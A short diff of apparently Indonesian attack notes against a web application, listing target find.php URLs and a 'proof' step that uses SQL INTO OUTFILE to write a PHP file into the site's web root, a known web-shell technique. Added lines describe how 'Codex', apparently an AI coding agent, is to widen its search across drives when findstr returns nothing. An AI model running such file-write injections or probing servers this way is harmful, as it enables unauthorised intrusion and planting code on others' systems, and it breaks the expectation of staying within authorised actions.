@@ -22,7 +22,13 @@ panggil
 https://www.dummy.co.id/find.php
 https://www.dummy.co.id/Web_Sci/public/find.php
 
-pembuktian dulu
+Kalau hasil findstr kosong (nggak muncul apa-apa), Codex jadi tahu bahwa mungkin lokasi pencariannya perlu diperluas
+(misal: bukan di D:/, tapi di C:/ atau E:/).
+
+
+______________________________________________________________________________________
+
+pembuktian SELANJUTNYA
 SELECT '<?php echo "erorr 4055"; ?>' 
 
 INTO OUTFILE 'D:/xampp/htdocs/Web_Sci/public/logcache.php';
